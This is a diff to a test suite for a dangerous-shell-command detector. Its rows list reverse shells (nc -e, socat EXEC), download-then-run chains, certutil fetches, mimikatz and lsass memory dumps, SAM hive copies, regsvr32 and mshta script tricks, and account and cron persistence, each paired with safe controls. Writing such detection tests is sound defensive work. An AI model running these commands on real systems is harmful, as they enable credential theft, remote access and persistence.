@@ -1541,6 +1541,29 @@ describe("Windows: an administrative program that destroys machine state", () =>
 		["net user admin P@ss /add", "creates an account"],
 		["net localgroup Administrators h /add", "adds to the administrators group"],
 		["net user admin NewPassword", "resets a password, with no /add to see"],
+		// Three programs whose dangerous form is a switch or a bareword rather than
+		// a verb, and the last two of those are the LOLBin pair.
+		//
+		// MEASURED in scratch directories under %TEMP%, with a control on each: with
+		// `a.txt` on the source side and `extra.txt` already at the destination,
+		// `robocopy src dst /MIR` and `robocopy src dst /PURGE` each left `a.txt` and
+		// nothing else, and the same command without either switch left `a.txt` *and*
+		// `extra.txt`. So the deletion is what those two switches add.
+		["robocopy C:\\src D:\\dst /MIR", "mirroring deletes what is only at the destination"],
+		["robocopy C:\\a C:\\b /mir /XD x", "lower case, with an exclusion after it"],
+		["robocopy C:\\a C:\\b /PURGE", "and the switch that only deletes"],
+		// `certutil /urlcache` with nothing else printed this machine's whole URL
+		// cache, `Cookie:` entries for visited sites included, and the same switch
+		// with `-f` in front of it is the download.
+		["certutil -urlcache -split -f http://e/x.dll C:\\x.dll", "a fetch with no allow-list in front of it"],
+		["certutil /urlcache", "and the cache dump on its own"],
+		["comsvcs.exe MiniDump 704 C:\\Windows\\Temp\\x 00000000", "writes another process's memory out"],
+		["comsvcs.exe MiniDumpW 704 C:\\Windows\\Temp\\x 00000000", "and the wide entry point"],
+		// `load` mounts a hive file into the live registry; `unload` takes it back out.
+		// `save` and `export` are NOT here — they are ordinary backup verbs and the
+		// rows below prove the table agrees.
+		["reg load HKLM\\Temp C:\\s.hiv", "mounts a hive into the live registry"],
+		["reg unload HKLM\\Temp", "and takes it back out"],
 	])("%s is dangerous — %s", (command) => {
 		expect(windows(command)).not.toBeNull();
 	});
@@ -1574,6 +1597,16 @@ describe("Windows: an administrative program that destroys machine state", () =>
 		["taskkill /im node.exe", "asks before killing"],
 		["tasklist", "lists processes"],
 		["vssadmin list shadows", "lists shadow copies"],
+		// The control that gives the two robocopy rows above their meaning, and the
+		// other half of the same coin for certutil: `-encode` writes a *text*
+		// representation of a certificate rather than fetching anything.
+		["robocopy C:\\a C:\\b", "copies, which is what robocopy does the rest of the time"],
+		["robocopy C:\\a C:\\b /E /T /R:1", "and with every other switch except the deleting two"],
+		["certutil -encode a.der b.txt", "encodes rather than downloads"],
+		["certutil -dump a.der", "and dumps rather than downloads"],
+		// The ordinary `reg export`, which is what a person does before a big
+		// registry change. The rule reads the *target*, and this target is ordinary.
+		["reg export HKLM\\SOFTWARE C:\\before-a-regedit.reg", "backing up an ordinary key"],
 	])("%s is not dangerous — %s", (command) => {
 		expect(windows(command)).toBeNull();
 	});
@@ -2728,6 +2761,15 @@ describe("git: throwing away work", () => {
 		["git reset --hard origin/main", "onto another branch"],
 		["git checkout -- .", "the index-over working copy spelling"],
 		["git checkout -- src/index.ts", "for one path"],
+		// MEASURED, in a throwaway repo under %TEMP%: `git checkout .` printed
+		// `Updated 1 path from the index` and left the modified file back at its
+		// committed contents, with no `--` and no other argument. `git branch .` on
+		// the same repo answered `fatal: '.' is not a valid branch name` and exited
+		// 128, which is what rules out reading the `.` as anything but a path.
+		["git checkout .", "the bare dot, which discards the whole working copy"],
+		["git checkout ./", "and the same with a slash"],
+		["git checkout . src/index.ts", "the dot beside another path"],
+		["git checkout -- .", "the two spellings are both caught, and separately named"],
 		["git restore .", "and the newer command for the same thing"],
 		["git restore --source=HEAD --staged --worktree .", "with both targets named"],
 	])("%s is dangerous — %s", (command) => {
@@ -2839,6 +2881,16 @@ describe("containers, clusters, registries and forges", () => {
 		["docker rm -f web", "kills and deletes a running container"],
 		["docker rm --force web", "the long spelling"],
 		["docker rmi -f myimage:latest", "and the image"],
+		// The `-f` above is what carried it before; without it the deletion is just
+		// as final, and a locally built image is the one that cannot be pulled back.
+		["docker rmi myimage:latest", "the same without the flag, which still deletes"],
+		["docker rmi --no-prune myimage", "and with the switch that only keeps the other images"],
+		// `docker-compose` is the hyphenated spelling of the same command tree, and
+		// `down -v` under it deletes the volumes' data. Both are the modern and the
+		// legacy name of one thing, so a rule that read only `docker compose` left
+		// the name a large share of scripts still use uncovered.
+		["docker-compose down -v", "the hyphenated name of the same delete"],
+		["docker-compose down --volumes", "and its long spelling"],
 		["docker volume rm data", "which takes the data with it"],
 		["docker system prune", "everything unused"],
 		["docker system prune -a --volumes", "all of it, and the volumes"],
@@ -2873,6 +2925,9 @@ describe("containers, clusters, registries and forges", () => {
 		["docker images", "images lists"],
 		["docker volume ls", "and ls lists volumes"],
 		["docker run -d --name web nginx", "starting a container creates things"],
+		["docker-compose up -d", "and the hyphenated name of an ordinary start"],
+		["docker-compose config", "and of a command that only prints"],
+		["docker image ls", "image ls lists rather than deleting"],
 		["docker builder prune", "and this is the build cache, not anything running"],
 	])("%s is not dangerous — %s", (command) => {
 		expect(posix(command)).toBeNull();
@@ -4237,5 +4292,491 @@ describe("Windows: the PowerShell twins that were still missing", () => {
 		expect(windows("Remove-ItemProperty -Path HKLM:\\SAM")?.rule).toContain("reg delete");
 		// The CMD twin keeps its own wording; the PS row must not have replaced it.
 		expect(windows("schtasks /run /tn x")?.rule).toBe("`schtasks /run`, which destroys machine state");
+	});
+});
+
+/**
+ * POSIX: an account is a way back into the machine.
+ *
+ * None of these five programs is destructive in the way `rm -rf` is, and that is
+ * exactly why they were missing: each one hands out or reshapes an account, and
+ * an account outlives the session that made it. The whole-program table is the
+ * right shape for them because there is no read-only spelling of any — `id`,
+ * `whoami` and `getent` read an account and are not in it.
+ */
+describe("POSIX: an account that can be handed more than it had", () => {
+	test.each([
+		["usermod -aG sudo bob", "adds a group membership, which can be the sudoers one"],
+		["usermod -s /bin/bash bob", "and changes the login shell"],
+		["useradd -m -s /bin/bash evil", "creates an account"],
+		["adduser evil", "the Debian spelling of the same"],
+		["userdel -r bob", "deletes one, taking its home directory with it"],
+		["chpasswd", "sets account passwords from standard input"],
+		["setcap cap_sys_admin+ep ./x", "gives a file a capability it keeps without being set-user-ID"],
+		["sudo usermod -aG sudo bob", "and the same through sudo, which the wrapper walk already reaches"],
+		// A whole-program rule has no exemption, and saying so is more useful than
+		// pretending otherwise: `adduser --help` is caught, exactly as `format /?` is
+		// caught by the Windows table beside it. That is the price of the shape, and
+		// it is the shape that catches `usermod` with no arguments at all.
+		["adduser --help", "which the whole-program rule catches too, and does not claim not to"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	test.each([
+		["id bob", "reads an account rather than changing one"],
+		["whoami", "and so does this"],
+		["getent passwd", "which lists all of them"],
+		["getcap ./x", "reads the capabilities the rule above writes"],
+		["chown bob file", "changing a file's owner is the permissions rule, not this one"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	test("each program names the act it does rather than the family it belongs to", () => {
+		expect(posix("useradd -m evil")?.rule).toBe(
+			"`useradd`, which creates an account, which is a way back into this machine",
+		);
+		expect(posix("usermod -aG sudo bob")?.rule).toBe(
+			"`usermod`, which changes an account, which can hand it more than it had",
+		);
+		expect(posix("userdel bob")?.rule).toBe("`userdel`, which deletes an account");
+		expect(posix("setcap cap_sys_admin+ep ./x")?.rule).toContain("without being set-user-ID");
+	});
+});
+
+/**
+ * POSIX: a command that runs later, with nobody there to read what it did.
+ *
+ * The distinction every row below turns on is *scheduling* against *running*:
+ * `crontab -e` opens an editor and `at -l` lists, while `crontab <file>`
+ * installs and `at now` queues. Only the second kind outlives the session, and
+ * only the second kind has no prompt in front of it when it runs.
+ *
+ * `CRONTAB_NON_INSTALLING_FLAGS` is the whole of the exemption, and it is a set
+ * rather than a check for "starts with a dash" because the three flags on it take
+ * no value. `-r` is the destructive one and is still in it: it deletes the one
+ * crontab the user has, which is named and reversible by writing it back, rather
+ * than installing something that will run at times the user is not there.
+ */
+describe("POSIX: a command that runs later, with nobody watching", () => {
+	test.each([
+		["at now + 1 minute", "queues a job for a minute from now"],
+		["at 23:00", "and the clock form"],
+		["echo 'ls /' | at now", "and the piped spelling, which is how most people type it"],
+		["batch", "queues one to start the moment nobody is logged in"],
+		["crontab /tmp/job", "installs a crontab file"],
+		["crontab ./newjob", "and a relative path to one"],
+		["echo '* * * * * ls' | crontab -", "and the stdin spelling, which installs too"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	test.each([
+		["at -l", "lists the queue, and changes nothing"],
+		["atq", "and so does the spelling without the dash"],
+		["crontab -e", "opens an editor rather than installing"],
+		["crontab -l", "lists"],
+		["crontab -r", "removes the one named crontab, which is a different act from installing one"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	test("the three programs name their own acts, and cron says what makes it different", () => {
+		expect(posix("at now")?.rule).toBe("`at`, which runs a command later, without anyone there to read what it did");
+		expect(posix("batch")?.rule).toBe("`batch`, which runs a command later, without anyone there to read what it did");
+		expect(posix("crontab /tmp/job")?.rule).toBe(
+			"`crontab`, which installs a job the scheduler runs with no login needed",
+		);
+	});
+});
+
+/**
+ * POSIX: a socket that runs a program instead of reading one.
+ *
+ * The ordinary `nc host 80` sends bytes and the ordinary `socat - TCP:host:1`
+ * moves bytes between two places. What these programs also have is a switch that
+ * hands the far end a command line instead, and the whole of the danger is that
+ * switch: it is remote code execution with a network listener in front of it.
+ *
+ * NETCAT_EXEC_FLAGS is a set rather than a single `-e` because the flag has
+ * three spellings across the three programs that share this name, and a rule
+ * that read one of them would miss the other two — which are the same program
+ * under different names.
+ *
+ * **The `socat` half is a substring test and this block shows what that costs.**
+ * `TCP-LISTEN:4444,fork EXEC:/bin/cat` is a port forward people legitimately
+ * write, and it is caught, because `EXEC:` appears in the address whatever is
+ * behind it. The alternative — parsing the address and exempting a known-safe
+ * program — is a list of programs this file would then have to keep correct, and
+ * every entry on it is one somebody forgot.
+ */
+describe("POSIX: a socket that runs a program instead of reading one", () => {
+	test.each([
+		["nc -e /bin/sh 10.0.0.1 4444", "the classic form"],
+		["nc -lvp 4444 -e /bin/bash", "the flag after the listener, which is where people put it"],
+		["ncat -e /bin/sh host 1", "the Nmap name for the same program"],
+		["netcat -e /bin/sh host 1", "and the third name"],
+		["nc --exec /bin/sh host 1", "the long spelling"],
+		["socat EXEC:'/bin/bash -li',pty,stderr host:1", "socat's address form"],
+		["socat tcp-connect:host:1 exec:/bin/bash", "and the same, reversed and lower case"],
+		["socat TCP-LISTEN:4444,fork EXEC:/bin/cat", "and the port forward the substring test cannot tell apart"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	test.each([
+		["nc host 80", "sends bytes to a listener"],
+		["nc -lvp 4444", "listens and sends nothing"],
+		["nc -z host 80", "a port probe"],
+		["socat - TCP:host:1", "moves bytes between two places"],
+		["socat -u FILE:/tmp/in TCP:host:1", "and this, which is a real and common socat"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	test("each program names what the switch does rather than what the socket is", () => {
+		expect(posix("nc -e /bin/sh host 1")?.rule).toBe(
+			"`nc` with a program behind it, which runs that program instead of reading this side of the socket",
+		);
+		expect(posix("ncat -e /bin/sh host 1")?.rule).toContain("`ncat`");
+		expect(posix("socat EXEC:/bin/sh host:1")?.rule).toBe(
+			"`socat` with an `EXEC:` address, which runs a program on the far end",
+		);
+	});
+});
+
+/**
+ * POSIX: a download written to a file and then run.
+ *
+ * This is the same act as the pipe rule and it was `null` while the pipe rule
+ * matched, which is the worst kind of gap: the two spellings differ only by
+ * whether the bytes move. Here nothing moves between the two commands — `curl`
+ * writes a file and `bash` reads it later — so no walk that follows a pipe can
+ * see them, and the pair has to be joined by *name* instead.
+ *
+ * **The name has to be on both sides.** A download to `/tmp/x` and a
+ * `bash /tmp/y` are two unrelated commands, and matching on "some interpreter
+ * somewhere later on the line" is the shape this file refuses to take everywhere
+ * else.
+ */
+describe("POSIX: a download written to a file and then run", () => {
+	test.each([
+		["curl -o /tmp/x.sh http://e/x.sh ; bash /tmp/x.sh", "the semicolon form"],
+		["curl -o /tmp/x.sh http://e/x.sh && bash /tmp/x.sh", "and the one that says 'and then'"],
+		["curl -o/tmp/x.sh http://e/x.sh ; bash /tmp/x.sh", "the value glued to the flag"],
+		["curl -o /tmp/x.sh http://e/x.sh\nbash /tmp/x.sh", "joined by a newline"],
+		["curl --output /tmp/x.sh http://e/x.sh ; bash /tmp/x.sh", "the long spelling"],
+		["curl --output=/tmp/x.sh http://e/x.sh ; bash /tmp/x.sh", "and the long spelling with an equals sign"],
+		["curl -sfo /tmp/x.sh http://e/x.sh ; bash /tmp/x.sh", "the flag bundled with others"],
+		["wget -O /tmp/x.sh http://e/x.sh ; sh /tmp/x.sh", "wget's own uppercase -O, into sh"],
+		["wget -O/tmp/x.sh http://e/x.sh ; sh /tmp/x.sh", "and the value glued to it"],
+		["curl -o /tmp/x.js http://e/x.js ; node /tmp/x.js", "into node rather than a shell"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	/**
+	 * The controls, and each one names which half of the pair is missing.
+	 *
+	 * The last is the interesting one: `curl -O` derives the filename from the URL
+	 * rather than being told it, so there is no name on the command line to join
+	 * the two halves by. The rule does not try to guess the URL's last path
+	 * segment, because a wrong guess there is a false positive on every ordinary
+	 * `curl -O` in a script.
+	 */
+	test.each([
+		["curl -o /tmp/x.sh http://e/x.sh", "a download that is never run"],
+		["bash /tmp/x.sh", "an interpreter with no download before it"],
+		["curl -o /tmp/x.sh http://e/x.sh ; cat /tmp/x.sh", "a second command that does not run it"],
+		["curl -o /tmp/x.sh http://e/x.sh ; bash /tmp/y.sh", "a different file name on the two sides"],
+		["curl -o /tmp/x.sh http://e/x.sh ; vim /tmp/x.sh", "and an editor rather than an interpreter"],
+		["curl -o- http://e/x.sh ; bash -", "writing to stdout, which the pipe rule covers instead"],
+		["curl -O http://e/x.sh ; bash x.sh", "curl -O names no file on the command line"],
+		["echo x > /tmp/x.sh ; bash /tmp/x.sh", "a local producer, which is not a download"],
+		["curl http://x/a | base64 -d > /tmp/x ; bash /tmp/x", "and the decoder hop the pipe block above pins as null"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	/**
+	 * The message names the file, the fetcher and the runner, because all three
+	 * are what a user is being asked to trust. Pinned verbatim for the same reason
+	 * the two-stage pipe message is: a clause that leaks across is the kind of
+	 * thing that reads as a bug in a prompt somebody is deciding against.
+	 */
+	test("the message names the file, the fetcher and the runner", () => {
+		expect(posix("curl -o /tmp/x.sh http://e/x.sh ; bash /tmp/x.sh")?.rule).toBe(
+			"`curl` writing `/tmp/x.sh` and `bash` then running it, which runs a script nobody has read",
+		);
+	});
+
+	test("the piped spelling keeps the pipe rule's own message, not this one's", () => {
+		expect(posix("curl -sL http://e/x.sh | bash")?.rule).toBe(
+			"`curl` piped into `bash`, which runs a script nobody has read",
+		);
+	});
+});
+
+/**
+ * POSIX: publishing a package every install can then fetch.
+ *
+ * The three are the same act in three languages, and none of it is reversible by
+ * the person who does it: a published crate, gem or distribution file can be
+ * taken down, but every machine that already fetched it has it.
+ *
+ * `--dry-run` is exempted, and it is the same `isDryRun` the git and docker
+ * blocks use rather than a second reader: `cargo publish --dry-run` performs
+ * every check and uploads nothing.
+ */
+describe("POSIX: publishing a package every install can then fetch", () => {
+	test.each([
+		["cargo publish", "publishes a crate"],
+		["gem push x.gem", "pushes a gem"],
+		["gem push --key x x.gem", "with the key named before the file"],
+		["twine upload dist/*", "uploads a distribution"],
+		["twine upload --repository pypi dist/*", "and to a named index"],
+	])("%s is dangerous — %s", (command) => {
+		expect(posix(command)).not.toBeNull();
+	});
+
+	test.each([
+		["cargo build", "builds locally"],
+		["cargo install ripgrep", "installs, which fetches rather than publishes"],
+		["cargo publish --dry-run", "checks everything and uploads nothing"],
+		["gem install x", "installs"],
+		["gem build x.gem", "builds"],
+		["twine download dist/*", "downloads, which is the opposite direction"],
+		["python -m pip install requests", "and pip, which installs rather than uploads"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(posix(command)).toBeNull();
+	});
+
+	test("each publisher names the act in its own words", () => {
+		expect(posix("cargo publish")?.rule).toBe(
+			"`cargo publish`, which changes what a published crate gives every install",
+		);
+		expect(posix("gem push x.gem")?.rule).toBe("`gem push`, which publishes a gem every install can then fetch");
+		expect(posix("twine upload x")?.rule).toBe(
+			"`twine upload`, which publishes a package every install can then fetch",
+		);
+	});
+
+	/**
+	 * A gap this block does not close, written down rather than left to be found.
+	 *
+	 * `python -m twine upload dist/*` is the same act and returns `null`, because
+	 * `segmentProgram` — the shared helper that skips wrappers and scaffolding —
+	 * stops at `python` rather than following the `-m` module name. Fixing it means
+	 * teaching that helper about `-m`, and it is shared with the pipe rule and the
+	 * exfiltration rule, so it is a wider change than this block earns on its own.
+	 * The row is asserted here as a *known* null rather than left out of the
+	 * controls above, because a control reads as an endorsement and this is not one.
+	 */
+	test("`python -m twine upload` is a known gap, and is null for a reason outside this rule", () => {
+		expect(posix("python -m twine upload dist/*")).toBeNull();
+		expect(posix("twine upload dist/*")).not.toBeNull();
+	});
+});
+
+/**
+ * Windows: a program whose name is the whole story.
+ *
+ * WINDOWS_ADMIN_ALWAYS is the table of programs with no read-only spelling.
+ * `regsvr32` and `mimikatz` join `format`, `diskpart` and `takeown`, and they
+ * are reachable from any platform: the `platform` argument is what this file
+ * uses everywhere instead of branching on `process.platform`.
+ *
+ * `regsvr32.exe /?` is caught below and the row says so rather than being left
+ * out — a whole-program rule has no `--help` exemption, and that is the same
+ * price `format /?` pays in the block above.
+ */
+describe("Windows: a program whose name is the whole story", () => {
+	test.each([
+		["regsvr32 evil.dll", "registers a DLL"],
+		["regsvr32 /s /u /i:C:\\Windows\\System32\\shell32.dll scrobj.dll", "the documented attack spelling"],
+		["C:\\Windows\\System32\\regsvr32.exe /i:evil.dll", "found through its full path and extension"],
+		["regsvr32.exe /?", "and asking it for help, which the whole-program rule catches too"],
+		["mimikatz", "the bare name"],
+		["mimikatz.exe sekurlsa::logonpasswords", "and the module it is usually run as"],
+		["cmd /c mimikatz.exe sekurlsa::logonpasswords", "reached through a cmd body"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	test.each([
+		["where regsvr32", "finding a program is not running it"],
+		// The name merely *containing* one of these is a different program, which is
+		// what `executableName`'s exact comparison is for.
+		["mimikatz-detector --scan", "a program whose name starts with one of these"],
+		["regsvr32-helper.dll", "and one that has it in the middle"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	test("each program carries its own reason rather than the table's", () => {
+		expect(windows("regsvr32 x.dll")?.rule).toBe(
+			"`regsvr32` — registers a DLL as a COM server, which is arbitrary code that a later process loads",
+		);
+		expect(windows("mimikatz")?.rule).toBe(
+			"`mimikatz` — extracts credentials out of a running Windows, and every mode it has is that",
+		);
+	});
+
+	test("the two new programs are not POSIX rules", () => {
+		expect(posix("regsvr32 evil.dll")).toBeNull();
+		expect(posix("mimikatz")).toBeNull();
+	});
+});
+
+/**
+ * Windows: a registry hive holding credentials, copied out to a file.
+ *
+ * `reg save` and `reg export` are ordinary backup verbs and are deliberately NOT
+ * in WINDOWS_ADMIN_VERBS — the verb set's own comment says so, and the row in
+ * the read-only list above that exports `HKLM\SOFTWARE` is what proves it. What
+ * makes these two dangerous is the *target*, so they are read beside the
+ * `reg add` Run-key check in `dangerousWindowsAdmin`, which is the same
+ * "read the argument rather than the verb" shape.
+ *
+ * The three non-matches below are the boundary, and they are the reason the
+ * predicate ends in `$` rather than in a word boundary or in nothing at all.
+ */
+describe("Windows: a registry hive holding credentials, copied out", () => {
+	test.each([
+		["reg save HKLM\\SAM C:\\sam.hiv /y", "the SAM hive, which is every local account"],
+		["reg export HKLM\\SYSTEM C:\\s.reg /y", "the SYSTEM hive, which carries the LSA secrets"],
+		["reg export HKLM\\SECURITY C:\\s.reg", "and the SECURITY hive"],
+		["reg export HKLM:\\SAM C:\\s.reg", "the PowerShell provider spelling of the same path"],
+		["cmd /c reg save HKLM\\SAM C:\\sam.hiv", "reached through a cmd body"],
+		["reg.exe save HKLM\\SAM out.hiv", "and through the program's full name"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	test.each([
+		["reg export HKLM\\SOFTWARE C:\\before.reg", "an ordinary key, and the backup people actually make"],
+		[
+			"reg save HKLM\\SYSTEM\\CurrentControlSet out.hiv",
+			"a child of a credential hive, which is hardware and service configuration",
+		],
+		["reg save HKLM\\SAM\\Domains out.hiv", "a child of the SAM hive, and a real limit of this rule"],
+		["reg save HKLM\\SAMPLES out.hiv", "a sibling key that merely starts with the same three letters"],
+		["reg query HKLM\\SAM", "reading the hive is not copying it out"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	test("the message names the verb, so the two are told apart", () => {
+		expect(windows("reg save HKLM\\SAM out.hiv")?.rule).toBe(
+			"`reg save`, which writes a copy of a registry hive holding account credentials",
+		);
+		expect(windows("reg export HKLM\\SAM out.reg")?.rule).toContain("`reg export`");
+	});
+
+	/**
+	 * Pinned separately from the rows above because this is the boundary and a
+	 * mutation that widened the predicate to a plain `includes` would pass every
+	 * match row and fail exactly these three.
+	 */
+	test("the hive name has to be the end of the path, and not merely inside it", () => {
+		expect(windows("reg save HKLM\\SAM\\Domains out.hiv")).toBeNull();
+		expect(windows("reg save HKLM\\SAMPLES out.hiv")).toBeNull();
+		expect(windows("reg save HKLM\\SAM out.hiv")).not.toBeNull();
+	});
+});
+
+/**
+ * Windows: procdump against the process that holds the credentials.
+ *
+ * The rule is narrow to `lsass` on purpose. `procdump -ma notepad.exe x.dmp` is
+ * what the tool is for, and `procdump` also has `-h` and `-c` modes that manage
+ * a process rather than dumping it, so a whole-program rule would have flagged
+ * the tool's own documentation and two of its non-dump modes.
+ *
+ * Nothing here was run. Dumping a live process's memory is the act rather than a
+ * sample of it, and the rows below are spellings rather than observations — the
+ * same way the `comsvcs` row in the block above is.
+ */
+describe("Windows: procdump against the process that holds the credentials", () => {
+	test.each([
+		["procdump -ma lsass.exe dump.dmp", "the switch first, then the process"],
+		["procdump lsass dump.dmp", "and the bare process name"],
+		["procdump -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp", "with a full destination"],
+		["procdump64 -ma lsass.exe dump.dmp", "the 64-bit build's own name, which is not an .exe suffix"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	test.each([
+		["procdump -ma notepad.exe x.dmp", "dumping an ordinary process is what the tool is for"],
+		["procdump -h notepad.exe", "hanging a process is not a dump"],
+		["procdump -c 100 notepad.exe", "and clamping one is not either"],
+		["procdump -accepteula -ma lsassx.exe x.dmp", "a process whose name merely starts with lsass is a different one"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	test("the message says what the memory holds rather than that a dump happened", () => {
+		expect(windows("procdump -ma lsass.exe x.dmp")?.rule).toBe(
+			"`procdump` against `lsass`, whose memory is where Windows keeps logon credentials",
+		);
+		expect(windows("procdump64 -ma lsass.exe x.dmp")?.rule).toContain("`procdump64`");
+	});
+});
+
+/**
+ * Windows: a script URI in place of a URL.
+ *
+ * `looksLikeUrl` accepts only `http:` and `https:`, which is the right rule for
+ * the launches it serves — the point of those is handing a URL to something that
+ * fetches or renders it. A `javascript:` or `vbscript:` argument is the other
+ * thing entirely: there is no fetch, nothing to review, and the payload is the
+ * argument. So `mshta javascript:...` was `null` while `mshta http://...` was a
+ * rule, and the two are told apart in the message rather than merged.
+ *
+ * Nothing here was executed either. `mshta` reports through a dialog rather than
+ * stdout — `mshta /?`, `mshta nosuchscheme://x` and `mshta vbscript:x` each
+ * wrote zero bytes to a redirected stdout and each exited 0 — so these rows are
+ * spellings, and the source comment says so in the same words.
+ */
+describe("Windows: a script URI in place of a URL", () => {
+	test.each([
+		["mshta javascript:alert(1)", "the unquoted spelling, which CMD cannot actually run"],
+		['mshta "javascript:alert(document.domain)"', "and the quoted one, which is the real spelling"],
+		["mshta vbscript:msgbox(1)", "the other script scheme"],
+		["mshta data:text/html,<script>alert(1)</script>", "the document inlined rather than fetched"],
+		["rundll32 javascript:alert(1)", "and the program whose argument is a DLL name"],
+		["cmd /c mshta vbscript:msgbox(1)", "reached through a cmd body"],
+		['powershell -Command "mshta vbscript:msgbox(1)"', "and through a PowerShell one"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	test.each([
+		["mshta C:\\windows\\system32\\certutil\\certutil.exe", "an ordinary local document"],
+		["mshta about:blank", "a scheme that renders nothing"],
+		// The `data:` alternative is split out from the other two precisely so this
+		// is not a match: a `data:` argument carrying a picture is rendered, and
+		// `(?:javascript|vbscript|data)\s*:` would have taken it.
+		["mshta data:image/png;base64,iVBORw0KGgo=", "a data URI carrying a picture rather than a document"],
+		["rundll32 shell32.dll,Control_RunDLL", "rundll32 doing what it is for"],
+		["mshta.exe /?", "asking for help is not running the argument"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	test("the message distinguishes a script URI from a URL, because the rules do", () => {
+		expect(windows("mshta vbscript:msgbox(1)")?.rule).toBe(
+			"`mshta` with a script URI, which runs the text in the argument",
+		);
+		expect(windows("mshta http://e/x.mshta")?.rule).toBe("`mshta` with a URL");
+		expect(windows("rundll32 javascript:x")?.rule).toContain("with a script URI");
+	});
+
+	test("a URL is still a URL, on the program whose rule already read one", () => {
+		expect(windows("rundll32 url.dll,FileProtocolHandler http://e/")?.rule).toBe(
+			"`rundll32 url.dll,FileProtocolHandler` with a URL",
+		);
 	});
 });
